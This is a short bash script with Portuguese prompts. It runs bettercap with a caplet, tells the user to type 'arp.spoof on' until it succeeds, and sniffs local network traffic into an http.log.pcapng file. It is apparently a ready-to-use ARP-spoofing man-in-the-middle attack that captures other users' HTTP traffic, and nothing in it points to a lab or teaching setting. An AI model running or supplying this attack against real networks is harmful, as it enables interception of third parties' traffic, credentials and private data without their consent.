#!/bin/bash

echo ""
echo "======================================================================================================================"
echo "Digite: arp.spoof on"        =====> 👀  Tentar Ligar o arp.spoof on   2 vezes ou mais ate da serto   👀
echo "======================================================================================================================"
echo ""

# Inicie o bettercap com o caplet e capture o tráfego HTTP
sudo bettercap -caplet "$CAPLET_PATH" -eval "set net.sniff.local true; set net.sniff.output http.log.pcapng; net.sniff on"

echo ""
echo ""
echo "Tráfego capturado salvo em: http.log.pcapng"
